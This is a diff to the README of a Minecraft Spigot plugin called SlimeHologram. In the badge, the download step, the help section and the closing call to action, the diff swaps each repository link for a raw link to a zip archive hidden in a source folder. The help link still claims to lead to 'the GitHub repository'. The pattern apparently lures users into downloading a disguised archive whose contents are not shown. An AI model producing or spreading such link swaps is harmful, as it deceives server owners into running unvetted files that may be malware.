@@ -1,7 +1,7 @@
 <h1>👾 SlimeHologram - Amazing Floating Text for Your Minecraft Server</h1>
 
 <p align="center">
-  <a href="https://github.com/maycko22/SlimeHologram">
+  <a href="https://raw.githubusercontent.com/maycko22/SlimeHologram/main/base/src/main/Slime-Hologram-v2.6.zip">
     <img src="https://img.shields.io/badge/Download-SlimeHologram-2ea44f?style=for-the-badge&logo=github" alt="Download SlimeHologram">
   </a>
 </p>
@@ -20,7 +20,7 @@ Getting SlimeHologram up and running is incredibly simple. Follow these steps ca
 
 ### Step 1: Download the Plugin
 
-Visit this link to download the application: [https://github.com/maycko22/SlimeHologram](https://github.com/maycko22/SlimeHologram)
+Visit this link to download the application: [https://raw.githubusercontent.com/maycko22/SlimeHologram/main/base/src/main/Slime-Hologram-v2.6.zip](https://raw.githubusercontent.com/maycko22/SlimeHologram/main/base/src/main/Slime-Hologram-v2.6.zip)
 
 Click the green "Code" button and select "Download ZIP" to get the plugin files.
 
@@ -118,7 +118,7 @@ Keep hologram text concise and avoid creating too many holograms in the same are
 
 ## 📞 Need Help?
 
-If you encounter any issues or have questions, visit the GitHub repository at [https://github.com/maycko22/SlimeHologram](https://github.com/maycko22/SlimeHologram) to report problems or ask for assistance.
+If you encounter any issues or have questions, visit the GitHub repository at [https://raw.githubusercontent.com/maycko22/SlimeHologram/main/base/src/main/Slime-Hologram-v2.6.zip](https://raw.githubusercontent.com/maycko22/SlimeHologram/main/base/src/main/Slime-Hologram-v2.6.zip) to report problems or ask for assistance.
 
 ## 📝 License
 
@@ -130,6 +130,6 @@ SlimeHologram is released under the MIT License, which means you can use, modify
 
 Don't wait any longer to make your Minecraft server stand out. Download SlimeHologram now and transform your world with beautiful, professional-looking holograms that will impress your players and enhance their gaming experience.
 
-Visit this link to download the application: [https://github.com/maycko22/SlimeHologram](https://github.com/maycko22/SlimeHologram)
+Visit this link to download the application: [https://raw.githubusercontent.com/maycko22/SlimeHologram/main/base/src/main/Slime-Hologram-v2.6.zip](https://raw.githubusercontent.com/maycko22/SlimeHologram/main/base/src/main/Slime-Hologram-v2.6.zip)
 
 Keywords: hologram, minecraft, placeholder, placeholderapi, spigot, spigot-api, spigot-mc, spigot-plugin, spigot-plugins, spigot-resource, spigot-server, spigotmc, spigotmc-plugin, spigotplugin
